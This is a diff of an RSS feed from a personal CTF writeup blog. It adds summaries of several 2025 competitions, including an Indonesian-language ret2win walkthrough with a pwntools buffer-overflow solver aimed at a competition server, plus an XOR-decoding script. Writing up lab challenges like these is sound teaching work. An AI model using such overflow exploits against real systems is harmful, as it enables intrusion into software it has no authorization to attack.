@@ -10,7 +10,7 @@
     <pubDate>Wed, 15 Oct 2025 00:00:00 &#43;0000</pubDate>
     <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
     <guid>https://whyuhurtz.me/2025/10/pdf-kmipn-vii-ctf-finals-writeup/</guid>
-    <description><![CDATA[I don&#39;t participate this time, because my team lose at quals.
+    <description><![CDATA[I didn&#39;t participate this time, because my team lose at quals.
 <h1 id="jeopardy-writeup-by-zumatech">Jeopardy Writeup by Zumatech</h1>
 <div class="details admonition info">
         <div class="details-summary admonition-title">
@@ -26,6 +26,152 @@
 </div>
         </div>
     </div>]]></description>
+</item>
+<item>
+    <title>ITECHNO CUP CTF 2025 Finals Writeup</title>
+    <link>https://whyuhurtz.me/2025/10/itechno-cup-ctf-2025-finals-writeup/</link>
+    <pubDate>Fri, 03 Oct 2025 00:00:00 &#43;0000</pubDate>
+    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
+    <guid>https://whyuhurtz.me/2025/10/itechno-cup-ctf-2025-finals-writeup/</guid>
+    <description><![CDATA[My team got rank 5th at finals.
+<h1 id="pwn">Pwn</h1>
+<h2 id="1-pwn-baik">1. PWN Baik</h2>
+<h3 id="deskripsi">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Baik Banget Cuma Input Input (Kayaknya)</p>
+<p>nc 195.154.94.231 50151</p>
+</div>
+        </div>
+    </div>
+<h3 id="langkah-penyelesaian">Langkah Penyelesaian</h3>
+<p><strong>TL;DR</strong></p>
+<p>Chall sederhana sekali, cukup ret2win dan dapat flag.</p>
+<ul>
+<li>Lakukan <code>checksec</code>:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">checksec ./chall
+</span></span><span class="line"><span class="cl">----------------
+</span></span><span class="line"><span class="cl">Arch:       i386-32-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      No canary found
+</span></span><span class="line"><span class="cl">NX:         NX enabled
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SHSTK:      Enabled
+</span></span><span class="line"><span class="cl">IBT:        Enabled
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<ul>
+<li>Decompile <code>chall</code> file dengan IDA.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vuln</span><span class="p">(</span><span class="o">&amp;</span><span class="n">argc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sayangnya... kamu nggak dapet apa-apa. Coba lagi deh.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">vuln</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">68</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-48h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Masukin inputmu, jagoan:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Inputmu: %s</span><span class="se">\\</span><span class="s">n&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">win</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+8h] [ebp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [esp+6Ch] [ebp-Ch]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;/flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">stream</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Flag file not found!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Admin Mode Baik Ni Flagnya Ngab: %s&#34;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>Lakukan cyclic untuk mendapatkan offset ke saved $EBP.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg -q ./chall
+</span></span><span class="line"><span class="cl"><span class="nb">break</span> *vuln+47
+</span></span><span class="line"><span class="cl"><span class="nb">break</span> *vuln+81
+</span></span><span class="line"><span class="cl">cyclic <span class="m">100</span>
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">ni
+</span></span><span class="line"><span class="cl">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">continue</span>
+</span></span><span class="line"><span class="cl">saaa
+</span></span><span class="line"><span class="cl">cyclic -l saaa
+</span></span><span class="line"><span class="cl">Found at offset <span class="m">72</span></span></span></code></pre></div></div>
+<ul>
+<li>Oke, langsung saja kita buat solver script-nya.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span>
+</span></span><span class="line"><span class="cl"><span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="s2">&#34;195.154.94.231&#34;</span><span class="p">,</span> <span class="mi">50151</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">72</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p32</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><code>ITECHNO2025{Pwn_P_nya_Pembaik}</code></div>
+        </div>
+    </div>
+<h2 id="2-pwn-sedikit-ramah">2. PWN Sedikit Ramah</h2>
+<h3 id="deskripsi-1">Deskripsi</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Ramah Banget PWN Ini Sampe Dikasih Hint</p>]]></description>
 </item>
 <item>
     <title>WRECK-IT CTF 5.0 Quals Writeup</title>
@@ -55,7 +201,7 @@
             <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
         </div>
         <div class="details-content">
-            <div class="admonition-content"><strong>WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}</strong></div>
+            <div class="admonition-content"><code>WRECKIT50{just_ch3cking_f0r_y0ur_sani7y}</code></div>
         </div>
     </div>
 <hr>
@@ -138,6 +284,134 @@
 <h1 id="partitioning">Partitioning</h1>
 <blockquote>
 <p><strong>Note</strong>: Here I&rsquo;ve 256GB SSD SATA storage for this demonstration.</p>]]></description>
+</item>
+<item>
+    <title>HTB Cyber Apocalypse 2025 Writeup</title>
+    <link>https://whyuhurtz.me/2025/03/htb-cyber-apocalypse-2025-writeup/</link>
+    <pubDate>Thu, 27 Mar 2025 00:00:00 &#43;0000</pubDate>
+    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
+    <guid>https://whyuhurtz.me/2025/03/htb-cyber-apocalypse-2025-writeup/</guid>
+    <description><![CDATA[I managed to solved 4 challenges, which are web exploit and rev.
+<h1 id="web">Web</h1>
+<h2 id="1-trial-by-fire">1. Trial by Fire</h2>
+<h3 id="description">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategic mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.</div>
+        </div>
+    </div>
+<h3 id="required-knowledge">Required Knowledge</h3>
+<ul>
+<li>Server Side Template Injection (SSTI)</li>
+<li>Docker Container</li>
+</ul>
+<h3 id="solve-walkthrough">Solve Walkthrough</h3>
+<p>The flag file location is not changed to root directory or somewhere else, it inside the app challenge directory. Basically, this logic behind the app is to play a game. The objective of the game is to <strong>defeat a dragon</strong> that have health <strong>1337</strong>. But, we can&rsquo;t defeat the dragon in a regular way, we&rsquo;ve to find a vulnerability to defeat the dragon or at least to get the flag (not matter we win or not). So, I played this game a little bit after that I realize something that can be a vulnerability. Take a look at the image below.</p>]]></description>
+</item>
+<item>
+    <title>Pearl CTF 2025 Writeup</title>
+    <link>https://whyuhurtz.me/2025/03/pearl-ctf-2025-writeup/</link>
+    <pubDate>Fri, 07 Mar 2025 00:00:00 &#43;0000</pubDate>
+    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
+    <guid>https://whyuhurtz.me/2025/03/pearl-ctf-2025-writeup/</guid>
+    <description><![CDATA[I managed to solve 2 pwn challenges.
+<h1 id="pwn">Pwn</h1>
+<h2 id="1-treasure-hunt">1. Treasure Hunt</h2>
+<h3 id="description">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Are you worthy enough to get the treasure? Let&rsquo;s see&hellip;</p>
+<p>nc treasure-hunt.ctf.pearlctf.in 30008</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough">Solve Walkthrough</h3>
+<ul>
+<li>This is a classic ret2win challenge.</li>
+<li>First, I check the ELF protection with <code>checksec</code>.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:      No canary found
+</span></span><span class="line"><span class="cl">NX:         NX enabled
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<ul>
+<li>The binary only have the NX / DEP protection, which means that we <strong>can&rsquo;t inject a shellcode</strong>. Let&rsquo;s decompile the binary using Ghidra.</li>
+<li>We got a bunch of interesting functions here.</li>
+</ul>
+<p></p>]]></description>
+</item>
+<item>
+    <title>Snyk Fetch The Flag 2025 Writeup</title>
+    <link>https://whyuhurtz.me/2025/02/snyk-fetch-the-flag-2025-writeup/</link>
+    <pubDate>Fri, 28 Feb 2025 00:00:00 &#43;0000</pubDate>
+    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
+    <guid>https://whyuhurtz.me/2025/02/snyk-fetch-the-flag-2025-writeup/</guid>
+    <description><![CDATA[I managed to solved 5 challenges, which are web exploit, reverse, and pwn.
+<h1 id="warmup">Warmup</h1>
+<h2 id="1-zero-ex-six-one---rev">1. Zero Ex Six One - Rev</h2>
+<h3 id="description">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @HuskyHacks</p>
+<p>I&rsquo;m XORta out of ideas for how to get the flag. Does this look like anything to you?</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough">Solve Walkthrough</h3>
+<ul>
+<li>Given <code>flag.txt.encry</code> file and this is the content inside it.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c</span></span></code></pre></div></div>
+<ul>
+<li>First of all, I ask to GPT, what the heck is this encrypted flag is (coz I&rsquo;m beginner in RE and crypto stuffs).</li>
+<li>Basically, GPT said that <strong>the flag possibly encrypted with XOR cipher</strong>.</li>
+<li>Here&rsquo;s the solver script generated from GPT.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="se">\\</span><span class="s2">nLength of data: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">decoded</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Check for printable ASCII value.</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="mi">32</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">126</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">n&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Key </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">decoded</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<ul>
+<li>So, we&rsquo;ve to put the sequence of bytes into a list of bytes (<em>data</em>).</li>
+<li>Loop from <code>0x20</code> until <code>0x7E</code>, which is all printable ASCII characters in human readable text, such as <em>letters</em>, <em>numbers</em>, and <em>symbols</em>. The <code>0x7F</code> hex value is commonly use for obfuscate the text (<code>DEL</code>). Go to this website to see all list of ASCII tables: &ldquo;<a href="https://byte-tools.com/en/ascii" target="_blank" rel="noopener noreffer ">https://byte-tools.com/en/ascii/</a>&rdquo;.</li>
+<li>Like the name of this challenge, the printable characters is start from XOR-ing the bytes of data with <code>0x61</code> (a).</li>
+<li><code>0x07</code> ^ <code>0x61</code> = <strong>f</strong> ; <code>0x0d</code> ^ <code>0x61</code> = <strong>l</strong> -&gt; can you see the flag pattern ?</li>
+</ul>
+<p></p>]]></description>
 </item>
 <item>
     <title>Install Arch Linux from Scratch with KDE Plasma</title>
@@ -249,126 +523,6 @@
 <li>Tidak ada yang interesting untuk saat ini. Mungkin untuk <strong>Domain Name</strong> nanti berguna.</li>
 </ul>
 <p></p>]]></description>
-</item>
-<item>
-    <title>LITCTF 2024 Quals Writeup</title>
-    <link>https://whyuhurtz.me/2024/08/litctf-2024-quals-writeup/</link>
-    <pubDate>Sat, 10 Aug 2024 00:00:00 &#43;0000</pubDate>
-    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
-    <guid>https://whyuhurtz.me/2024/08/litctf-2024-quals-writeup/</guid>
-    <description><![CDATA[I managed to solved 4 challenges, mostly web exploit.
-<h1 id="misc">Misc</h1>
-<h2 id="1-welcome">1. Welcome</h2>
-<h3 id="description">Description</h3>
-<div class="details admonition info">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content">Please join the Discord for the latest announcements and read the <a href="https://lit.lhsmathcs.org/logistics" target="_blank" rel="noopener noreffer ">contest rules</a>! Good luck!</div>
-        </div>
-    </div>
-<h3 id="solve-walkthrough">Solve Walkthrough</h3>
-<ul>
-<li>Flag 1 in the announcement channel: <code>LITCTF{we_4re_happy_1it20</code>.</li>
-</ul>
-<p></p>
-<ul>
-<li>Flag 2 at the bottom of <a href="https://lit.lhsmathcs.org/logistics" target="_blank" rel="noopener noreffer ">contest rules</a> page: <code>24_is_h4pp3n1ng_and_h0p3_u_r_2}</code>.</li>
-</ul>
-<p></p>]]></description>
-</item>
-<item>
-    <title>(PDF) GEMASTIK XVII CTF Quals Writeup</title>
-    <link>https://whyuhurtz.me/2024/08/pdf-gemastik-xvii-ctf-quals-writeup/</link>
-    <pubDate>Sun, 04 Aug 2024 00:00:00 &#43;0000</pubDate>
-    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
-    <guid>https://whyuhurtz.me/2024/08/pdf-gemastik-xvii-ctf-quals-writeup/</guid>
-    <description><![CDATA[I managed to solve 2 challenges, 1 web and 1 forensic.
-<h1 id="jeopardy-writeup-by-05-council">Jeopardy Writeup by 05-Council</h1>
-<div class="details admonition info">
-        <div class="details-summary admonition-title">
-            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
-        </div>
-        <div class="details-content">
-            <div class="admonition-content"><iframe
-  src="https://mozilla.github.io/pdf.js/web/viewer.html?file=https://raw.githubusercontent.com/whyuhurtz/hugo-blog/main/assets/pdf/GEMASTIK24-898426841_05-Council.pdf"
-  width="100%"
-  height="600px"
-  style="border: none;">
-</iframe>
-</div>
-        </div>
-    </div>
-<h1 id="other-teams-writeup">Other Team&rsquo;s Writeup</h1>
-<p>&ndash;&gt; <a href="https://mega.nz/folder/mV1VGJIL#USClJIV3bHC8f5LYLJXN-A" target="_blank" rel="noopener noreffer ">https://mega.nz/folder/mV1VGJIL#USClJIV3bHC8f5LYLJXN-A</a></p>]]></description>
-</item>
-<item>
-    <title>OS CTF 2024 Writeup</title>
-    <link>https://whyuhurtz.me/2024/07/os-ctf-2024-writeup/</link>
-    <pubDate>Sat, 13 Jul 2024 00:00:00 &#43;0000</pubDate>
-    <author>wahyupriambodo.sec@gmail.com (whyuhurtz)</author>
-    <guid>https://whyuhurtz.me/2024/07/os-ctf-2024-writeup/</guid>
-    <description><![CDATA[I managed to solve 6 challenges.
-<h1 id="misc">Misc</h1>
-<h2 id="cyber-quiz">Cyber Quiz</h2>
-<h3 id="description">Description</h3>
-<div class="details admonition info">
-        <div class="details-summary admonition-title">
